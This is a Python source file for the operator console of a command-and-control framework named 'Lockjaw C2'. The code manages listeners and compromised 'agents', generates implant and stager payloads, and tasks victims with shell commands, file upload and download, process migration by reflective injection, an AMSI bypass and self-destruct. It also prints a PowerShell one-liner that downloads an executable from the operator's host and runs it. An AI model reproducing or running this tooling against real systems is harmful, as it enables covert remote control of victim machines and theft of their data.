import requests
import sys
import json
import base64
import argparse
import shlex
import os
import asyncio

try:
    from prompt_toolkit.application import Application
    from prompt_toolkit.layout.containers import HSplit, Window
    from prompt_toolkit.layout.layout import Layout
    from prompt_toolkit.widgets import TextArea
    from prompt_toolkit.key_binding import KeyBindings
    from prompt_toolkit.history import InMemoryHistory
    from prompt_toolkit.document import Document
except ImportError:
    print("Error: The 'prompt_toolkit' package is not installed.")
    sys.exit(1)

class LockjawClient:
    def __init__(self, base_url, api_key, verify=True):
        self.base_url = base_url
        if not self.base_url.startswith('http://') and not self.base_url.startswith('https://'):
            self.base_url = 'https://' + self.base_url
        self.headers = {"Authorization": api_key}
        self.verify = verify
        if not verify:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def connect_ping(self):
        try:
            return requests.get(f"{self.base_url}/connect", headers=self.headers, verify=self.verify, timeout=5).status_code == 200
        except: return False

    def get_agents(self):
        try:
            res = requests.get(f"{self.base_url}/agents", headers=self.headers, verify=self.verify)
            return res.json() if res.status_code == 200 else f"Error: {res.status_code}"
        except Exception as e: return str(e)

    def list_listeners(self):
        try:
            res = requests.get(f"{self.base_url}/listeners", headers=self.headers, verify=self.verify, timeout=5)
            if res.status_code == 200: return res.json()
            return f"Error: {res.status_code} - {res.text}"
        except Exception as e: return f"Connection Error: {str(e)}"

    def get_listener_protocols(self):
        try:
            res = requests.get(f"{self.base_url}/listeners/protocols", headers=self.headers, verify=self.verify, timeout=5)
            if res.status_code == 200: return res.json()
            return f"Error: {res.status_code}"
        except Exception as e: return f"Connection Error: {str(e)}"

    def start_listener(self, protocol, port, domain=None, key=None):
        payload = {"protocol": protocol, "port": int(port), "domain": domain, "key": key}
        try:
            res = requests.post(f"{self.base_url}/listeners", headers=self.headers, json=payload, verify=self.verify)
            return res.json() if res.status_code == 200 else res.text
        except Exception as e: return str(e)

    def stop_listener(self, listener_id):
        try:
            res = requests.post(f"{self.base_url}/listeners/{listener_id}", headers=self.headers, verify=self.verify)
            return res.status_code == 200
        except: return False

    def delete_agent(self, agent_id):
        try:
            res = requests.post(f"{self.base_url}/agents/{agent_id}", headers=self.headers, verify=self.verify)
            return res.status_code == 200
        except: return False

    def generate_payload(self, host, port, domain="", protocol="http", format="exe", is_staged=False, key=None, sleep=5, jitter=20, name=None, use_ps=False):
        payload = {
            "host": host, "port": int(port), "domain": domain, 
            "protocol": protocol, "format": format, "is_staged": is_staged,
            "use_ps": use_ps,
            "key": key or "deadbeefdeadbeefdeadbeefdeadbeef",
            "sleep": int(sleep), "jitter": int(jitter),
            "name": name
        }
        try:
            res = requests.post(f"{self.base_url}/payload", headers=self.headers, json=payload, verify=self.verify, timeout=120)
            return res.json() if res.status_code == 200 else res.text
        except Exception as e: return str(e)

    def create_task(self, agent_id, command, arguments=""):
        payload = {"agent_id": agent_id, "command": command, "arguments": arguments}
        try:
            res = requests.post(f"{self.base_url}/tasks", headers=self.headers, json=payload, verify=self.verify)
            return res.json() if res.status_code == 200 else res.text
        except Exception as e: return str(e)

    def get_tasks(self, agent_id):
        try:
            res = requests.get(f"{self.base_url}/tasks/{agent_id}", headers=self.headers, verify=self.verify, timeout=5)
            if res.status_code == 200: return res.json()
            return f"Error: {res.status_code}"
        except Exception as e: return f"Connection Error: {str(e)}"

    def get_result(self, task_id):
        try:
            res = requests.get(f"{self.base_url}/results/{task_id}", headers=self.headers, verify=self.verify)
            if res.status_code == 200: return res.json()
            if res.status_code == 404: return {"status": "pending"}
            return None
        except: return None

def tabulate_simple(data, headers):
    if not data: return "No data available."
    widths = [len(h) for h in headers]
    for row in data:
        for i, val in enumerate(row):
            widths[i] = max(widths[i], len(str(val)) if val else 0)
    header_line = " | ".join(h.ljust(widths[i]) for i, h in enumerate(headers))
    separator = "-+-".join("-" * widths[i] for i in range(len(headers)))
    rows = [" | ".join(str(row[i]).ljust(widths[i]) for i in range(len(row))) for row in data]
    return f"{header_line}\n{separator}\n" + "\n".join(rows)

class LockjawTUI:
    def __init__(self, client):
        self.client = client
        self.context = "global" # global, agent, listener
        self.current_agent = None

        self.output_field = TextArea(text="Lockjaw C2 Shell v0.2.15\nType 'help' to list commands.\n", read_only=True, scrollbar=True)






        self.input_field = TextArea(height=1, prompt=lambda: self.get_prompt(), multiline=False, history=InMemoryHistory(), accept_handler=self.accept_handler)
        self.layout = Layout(HSplit([self.output_field, self.input_field]), focused_element=self.input_field)
        self.kb = KeyBindings()
        
        @self.kb.add('c-c')
        @self.kb.add('c-d')
        def _(event): event.app.exit()

        @self.kb.add('tab')
        def _(event):
            if event.app.layout.has_focus(self.input_field):
                event.app.layout.focus(self.output_field)
            else:
                event.app.layout.focus(self.input_field)

        @self.kb.add('pageup')
        def _(event):
            self.output_field.buffer.cursor_up(count=10)

        @self.kb.add('pagedown')
        def _(event):
            self.output_field.buffer.cursor_down(count=10)

        @self.kb.add('s-up')
        def _(event):
            self.output_field.buffer.cursor_up(count=1)

        @self.kb.add('s-down')
        def _(event):
            self.output_field.buffer.cursor_down(count=1)

        self.app = Application(layout=self.layout, key_bindings=self.kb, full_screen=True, mouse_support=False)

        # Monitoring state
        self.known_agents = set()
        self.agent_map = {} # index -> id
        self.pending_downloads = {} # task_id -> local_path
        self.monitor_task = None

        # Command whitelists
        self.VALID_AGENT_COMMANDS = [
            "shell", "die", "tasks", "result", "back", "help", "?",
            "sleep", "pwd", "cd", "ls", "cat", "rm", "upload", "download",
            "ps", "whoami", "ipconfig", "pid", "amsi", "migrate", "self_destruct",
            "sc_enum", "sc_query", "bof"
        ]
        self.VALID_LISTENER_COMMANDS = ["list", "start", "stop", "back", "help", "?"]


    async def start_background_tasks(self):
        self.monitor_task = asyncio.create_task(self.monitor_agents())

    def get_prompt(self):
        if self.context == "agent": return f"(agent:{self.current_agent[:8]})> "
        if self.context == "listener": return "(lockjaw:listener)> "
        return "(lockjaw)> "

    def print_text(self, text):
        # Temporarily enable editing if read_only is True
        was_read_only = self.output_field.read_only
        self.output_field.read_only = False
        
        # Directly append to the buffer for reliability and scrolling
        self.output_field.buffer.insert_text(str(text) + "\n")
        
        # Restore read_only state
        self.output_field.read_only = was_read_only
        
        # Ensure the cursor is at the end to force scrolling
        self.output_field.buffer.cursor_position = len(self.output_field.text)
        
        # Signal that the UI needs to be redrawn
        if hasattr(self, 'app'):
            self.app.invalidate()

    def resolve_agent_id(self, partial_id):
        # 1. Try numeric index
        if partial_id.isdigit():
            idx = int(partial_id)
            if idx in self.agent_map:
                return self.agent_map[idx]
        
        # 2. Try prefix matching
        agents = self.client.get_agents()
        if not isinstance(agents, list): return None
        matches = [a['id'] for a in agents if a['id'].startswith(partial_id)]
        if len(matches) == 1: return matches[0]
        if len(matches) > 1:
            self.print_text(f"!!! Ambiguous ID: multiple matches for {partial_id}")
            return None
        self.print_text(f"!!! Error: No agent found matching {partial_id}")
        return None

    async def monitor_agents(self):
        # Initial population
        initial = await asyncio.to_thread(self.client.get_agents)
        if isinstance(initial, list):
            self.known_agents = {a['id'] for a in initial}
            self.agent_map = {i+1: a['id'] for i, a in enumerate(initial)}

        while True:
            await asyncio.sleep(10)
            agents = await asyncio.to_thread(self.client.get_agents)
            if isinstance(agents, list):
                # Update agent map in background so interact/remove work immediately
                self.agent_map = {i+1: a['id'] for i, a in enumerate(agents)}
                for a in agents:
                    if a['id'] not in self.known_agents:
                        self.print_text(f"\n[!] New Agent Connected: {a['id'][:8]}@{a['hostname']} (Internal: {a['ip_address']}, External: {a['external_ip']})")
                        self.known_agents.add(a['id'])

    def accept_handler(self, buff):
        line = buff.text.strip()
        buff.reset()
        self.print_text(f"{self.get_prompt()}{line}")
        try: 
            parts = shlex.split(line)
        except Exception as e: 
            self.print_text(f"!!! Error parsing command: {e}")
            return
            
        if not parts: return
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == "exit": self.app.exit()
        elif cmd == "back":
            self.context = "global"
            self.current_agent = None

        elif cmd == "help" or cmd == "?": self.do_help()
        elif self.context == "global": self.handle_global(cmd, args)
        elif self.context == "agent": self.handle_agent(cmd, args)
        elif self.context == "listener": self.handle_listener(cmd, args)

    def do_help(self):
        if self.context == "global":
            self.print_text("Global Commands:\n  agents          List agents\n  interact <id>   Interact with agent (supports index or prefix)\n  remove <id>     Delete agent from DB\n  listeners       Enter listener context\n  generate        Generate payload\n  powershell      Get PS one-liner\n  exit            Exit")
        elif self.context == "agent":
            self.print_text("Agent Commands:\n  shell <cmd>     Run shell command\n  die             Kill agent\n  tasks           List tasks\n  result <id>     Get task result\n  back            Back to global\n\n"
                            "Foundational Commands:\n  sleep <s [j]>   Set sleep/jitter\n  pwd             Print working directory\n  cd <dir>        Change directory\n\n"
                            "File Management:\n  ls [dir]        List directory\n  cat <file>      Read file\n  rm <file>       Delete file\n  upload <l> <r>  Upload file\n  download <r> <l> Download file\n\n"
                            "Execution:\n  bof <path> [args] Run Beacon Object File (BOF)\n\n"
                            "Situational Awareness:\n  ps              List processes (Arch, User, ACG, CFG info)\n  sc_enum         Enumerate all Windows services\n  sc_query <name> Query specific service configuration\n  whoami          Get current context\n  ipconfig        Get network info\n  pid             Get current process ID\n  amsi            Enable AMSI bypass (HWBP)\n  migrate <pid> [method] Migrate (reflective|reflective_poolstomp)\n  self_destruct   Kill agent and delete file\n\n")
        elif self.context == "listener":
            self.print_text("Listener Commands:\n  list            List listeners\n  start <type> <port> [domain]\n  stop <id>       Stop listener\n  back            Back to global")

    def handle_global(self, cmd, args):
        if cmd == "agents":
            agents = self.client.get_agents()
            if isinstance(agents, list):
                self.agent_map = {i+1: a['id'] for i, a in enumerate(agents)}
                data = [[i+1, a['id'][:8], a['hostname'], a['username'], f"{a['ip_address']} / {a['external_ip']}", a['status'], a['last_seen']] for i, a in enumerate(agents)]
                self.print_text(tabulate_simple(data, ["#", "ID", "Host", "User", "IP (Int/Ext)", "Status", "Seen"]))
            else: self.print_text(f"!!! {agents}")
        elif cmd == "interact":
            if not args:
                self.print_text("Usage: interact <index or prefix>")
                return
            full_id = self.resolve_agent_id(args[0])
            if full_id:
                self.current_agent = full_id
                self.context = "agent"
    
                self.print_text(f"[*] Interacting with {full_id[:8]}...")
        elif cmd == "remove" or cmd == "delete":
            if not args:
                self.print_text("Usage: remove <index or prefix>")
                return
            full_id = self.resolve_agent_id(args[0])
            if full_id:
                if self.client.delete_agent(full_id):
                    self.print_text(f"[+] Agent {full_id[:8]} removed.")
                    self.known_agents.discard(full_id)
                else:
                    self.print_text(f"!!! Failed to remove agent.")
        elif cmd == "listeners": 
            self.context = "listener"

        elif cmd == "generate": self.do_generate(args)
        elif cmd == "powershell": self.do_powershell(args)
        else: self.print_text(f"Unknown command: {cmd}")

    async def wait_for_task_result(self, task_id, timeout=30):
        self.print_text(f"[*] Waiting for task {task_id[:8]} results...")
        start_time = asyncio.get_event_loop().time()
        while asyncio.get_event_loop().time() - start_time < timeout:
            # Poll results in a thread to keep UI semi-responsive if requests block
            res = await asyncio.to_thread(self.client.get_result, task_id)
            if res and res.get("status") != "pending":
                # Handle special output (like downloads)
                output_bytes = bytes(res.get('output', []))
                
                if task_id in self.pending_downloads:
                    local_path = self.pending_downloads.pop(task_id)
                    try:
                        with open(local_path, "wb") as f:
                            f.write(base64.b64decode(output_bytes))
                        self.print_text(f"\n[+] File downloaded to {os.path.abspath(local_path)}")
                    except Exception as e:
                        self.print_text(f"\n[!] Failed to save download: {e}")
                else:
                    output = output_bytes.decode('utf-8', errors='replace')
                    self.print_text(f"\n[+] Result for {task_id[:8]}:\n{output}")
                return
            await asyncio.sleep(1)
        self.print_text("[!] Timeout waiting for result. Use 'result <id>' to check later.")

    def handle_agent(self, cmd, args):
        if cmd not in self.VALID_AGENT_COMMANDS:
            self.print_text(f"Unknown agent command: {cmd}. Type 'help' for options.")
            return

        if cmd == "tasks":
            tasks = self.client.get_tasks(self.current_agent)
            if isinstance(tasks, list):
                data = [[t['id'], t['command'], t['status']] for t in tasks]
                self.print_text(tabulate_simple(data, ["ID", "Command", "Status"]))
            else: self.print_text(f"!!! {tasks}")
        elif cmd == "result":
            if not args:
                self.print_text("Usage: result <task_id>")
                return
            res = self.client.get_result(args[0])
            if res:
                if res.get("status") == "pending": self.print_text("Pending...")
                else: 
                    # Handle manual result checking (check pending_downloads)
                    output_bytes = bytes(res.get('output', []))
                    if args[0] in self.pending_downloads:
                        local_path = self.pending_downloads.pop(args[0])
                        try:
                            with open(local_path, "wb") as f:
                                f.write(base64.b64decode(output_bytes))
                            self.print_text(f"\n[+] File downloaded to {os.path.abspath(local_path)}")
                        except Exception as e:
                            self.print_text(f"\n[!] Failed to save download: {e}")
                    else:
                        output = output_bytes.decode('utf-8', errors='replace')
                        self.print_text(f"\n[+] Result:\n{output}")
        elif cmd == "upload":
            if len(args) < 2:
                self.print_text("Usage: upload <local_path> <remote_path>")
                return
            local_path, remote_path = args[0], args[1]
            try:
                with open(local_path, "rb") as f:
                    b64_data = base64.b64encode(f.read()).decode('ascii')
                res = self.client.create_task(self.current_agent, "upload", f"{remote_path} {b64_data}")
                if isinstance(res, dict) and "task_id" in res:
                    asyncio.create_task(self.wait_for_task_result(res["task_id"]))
                else: self.print_text(f"Task creation failed: {res}")
            except Exception as e: self.print_text(f"!!! {e}")
        elif cmd == "download":
            if len(args) < 1:
                self.print_text("Usage: download <remote_path> [local_path]")
                return
            remote_path = args[0]
            local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)
            res = self.client.create_task(self.current_agent, "download", remote_path)
            if isinstance(res, dict) and "task_id" in res:
                self.pending_downloads[res["task_id"]] = local_path
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
            else: self.print_text(f"Task creation failed: {res}")
        elif cmd == "bof":
            if len(args) < 1:
                self.print_text("Usage: bof <local_path_to_obj> [optional_b64_args]")
                return
            bof_path = args[0]
            if not os.path.exists(bof_path):
                self.print_text(f"!!! Error: File not found: {bof_path}")
                return
            try:
                with open(bof_path, "rb") as f:
                    coff_data = f.read()
                b64_coff = base64.b64encode(coff_data).decode('ascii')
                
                b64_args = args[1] if len(args) > 1 else ""
                
                self.print_text(f"[*] Tasking agent to run BOF: {os.path.basename(bof_path)} ({len(coff_data)} bytes)...")
                res = self.client.create_task(self.current_agent, "bof", f"{b64_coff} {b64_args}")
                if isinstance(res, dict) and "task_id" in res:
                    asyncio.create_task(self.wait_for_task_result(res["task_id"]))
                else: self.print_text(f"Task creation failed: {res}")
            except Exception as e:
                self.print_text(f"!!! Error reading BOF: {e}")
        elif cmd == "migrate":
            if len(args) < 1:
                self.print_text("Usage: migrate <pid> [reflective|reflective_poolstomp]")
                return
            target_pid = args[0]
            requested_method = args[1].lower() if len(args) > 1 else "reflective"
            
            if requested_method not in ["reflective", "reflective_poolstomp"]:
                self.print_text("Error: Only 'reflective' and 'reflective_poolstomp' methods are supported.")
                return

            if requested_method == "reflective":
                self.print_text(f"[*] Sending migration task to agent (Target PID: {target_pid}, Method: Direct Reflective)...")
                res = self.client.create_task(self.current_agent, "migrate", f"{target_pid} reflective")
                if isinstance(res, dict) and "task_id" in res:
                    asyncio.create_task(self.wait_for_task_result(res["task_id"]))
                else: self.print_text(f"Task creation failed: {res}")
                return

            if requested_method == "reflective_poolstomp":
                self.print_text(f"[*] Sending migration task to agent (Target PID: {target_pid}, Method: Reflective PoolStomp)...")
                res = self.client.create_task(self.current_agent, "migrate", f"{target_pid} reflective_poolstomp")
                if isinstance(res, dict) and "task_id" in res:
                    asyncio.create_task(self.wait_for_task_result(res["task_id"]))
                else: self.print_text(f"Task creation failed: {res}")
                return
        elif cmd == "sleep":
            if not args:
                self.print_text("Usage: sleep <seconds> [jitter_percentage]")
                return
            res = self.client.create_task(self.current_agent, "sleep", " ".join(args))
            if isinstance(res, dict) and "task_id" in res:
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
        elif cmd == "cd":
            if not args:
                self.print_text("Usage: cd <directory>")
                return
            res = self.client.create_task(self.current_agent, "cd", " ".join(args))
            if isinstance(res, dict) and "task_id" in res:
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
        elif cmd == "rm":
            if not args:
                self.print_text("Usage: rm <file_path>")
                return
            res = self.client.create_task(self.current_agent, "rm", " ".join(args))
            if isinstance(res, dict) and "task_id" in res:
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
        elif cmd == "shell":
            if not args:
                self.print_text("Usage: shell <command>")
                return
            res = self.client.create_task(self.current_agent, "shell", " ".join(args))
            if isinstance(res, dict) and "task_id" in res:
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
        elif cmd == "back": # Should be handled in handle_input but added for safety
            self.context = "global"
            self.current_agent = None
        elif cmd in ["help", "?"]:
            self.do_help()
        else: # Simple tasking for commands with no complex client-side logic
            res = self.client.create_task(self.current_agent, cmd, " ".join(args))
            if isinstance(res, dict) and "task_id" in res:
                # Start polling task in background
                asyncio.create_task(self.wait_for_task_result(res["task_id"]))
            else:
                self.print_text(f"Task creation failed: {res}")

    def handle_listener(self, cmd, args):
        if cmd not in self.VALID_LISTENER_COMMANDS:
            self.print_text(f"Unknown listener command: {cmd}. Type 'help' for options.")
            return

        if cmd == "list":
            listeners = self.client.list_listeners()
            if isinstance(listeners, list):
                self.print_text("--- Active Listeners ---")
                self.print_text(tabulate_simple(listeners, ["ID", "Type"]))
            else: self.print_text(f"!!! {listeners}")
            
            protocols = self.client.get_listener_protocols()
            if isinstance(protocols, list):
                self.print_text("\n--- Available Protocols ---")
                data = [[p] for p in protocols]
                self.print_text(tabulate_simple(data, ["Protocol"]))
            else: self.print_text(f"!!! {protocols}")
        elif cmd == "start":
            if len(args) < 2:
                self.print_text("Usage: start <type> <port> [domain]")
                return
            res = self.client.start_listener(args[0], args[1], args[2] if len(args)>2 else None)
            self.print_text(res)
        elif cmd == "stop":
            if not args:
                self.print_text("Usage: stop <id>")
                return
            if self.client.stop_listener(args[0]): self.print_text("Stopped.")
            else: self.print_text("Failed.")
        elif cmd == "back":
            self.context = "global"
        elif cmd in ["help", "?"]:
            self.do_help()

    def do_generate(self, args):
        if len(args) < 2:
                self.print_text("Usage: generate <host> <port> [domain] [--name <str>] [--format <exe|dll|ps1>] [--protocol <http|https|dns>] [--sleep <int>] [--staged]")
                return
        
        is_staged = "--staged" in args
        
        # Parse format
        fmt = "exe"
        if "--format" in args:
            idx = args.index("--format")
            if idx + 1 < len(args): fmt = args[idx+1]

        # Parse protocol
        protocol = "https"
        if "--protocol" in args:
            idx = args.index("--protocol")
            if idx + 1 < len(args): protocol = args[idx+1]

        # Parse sleep
        sleep = 5
        if "--sleep" in args:
            idx = args.index("--sleep")
            if idx + 1 < len(args): sleep = args[idx+1]

        # Parse name
        name = None
        if "--name" in args:
            idx = args.index("--name")
            if idx + 1 < len(args): name = args[idx+1]
        
        clean_args = [a for a in args if a not in ["--staged", "--format", fmt, "--name", name, "--sleep", sleep, "--protocol", protocol]]
        host, port = clean_args[0], clean_args[1]
        domain = clean_args[2] if len(clean_args) > 2 else ""
        
        self.print_text(f"Generating {fmt} {'stager' if is_staged else 'implant'} (protocol: {protocol}, sleep: {sleep}s)...")
        res = self.client.generate_payload(host, port, domain, protocol=protocol, format=fmt, is_staged=is_staged, name=name, sleep=sleep)
        if isinstance(res, dict) and res.get("status") == "success":
            name = res["file_name"]
            with open(name, "wb") as f: f.write(base64.b64decode(res["payload_base64"]))
            self.print_text(f"Saved to {os.path.abspath(name)}")
        else: self.print_text(res)

    def do_powershell(self, args):
        if len(args) < 2:
            self.print_text("Usage: powershell <host> <port>")
            return
        host, port = args[0], args[1]
        cmd = f"$w=New-Object System.Net.WebClient;$f=\"$env:TEMP\\lj.exe\";$w.DownloadFile(\"https://{host}:{port}/stage\",\"$f\");Start-Process \"$f\""
        self.print_text(f"PowerShell One-Liner:\n{cmd}")

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default="50051")
    parser.add_argument("--key", default="lockjaw_secret_key")
    args = parser.parse_args()
    client = LockjawClient(f"https://{args.host}:{args.port}", args.key, verify=False)
    
    # Perform initial connectivity check
    print(f"Connecting to Teamserver at {client.base_url}...")
    # Use to_thread for the initial check to not block the event loop
    if not await asyncio.to_thread(client.connect_ping):
        print("Warning: Could not connect to Teamserver. Check host, port, and API key.")
    
    tui = LockjawTUI(client)
    # Start background polling
    asyncio.create_task(tui.monitor_agents())
    await tui.app.run_async()

if __name__ == "__main__":
    asyncio.run(main())
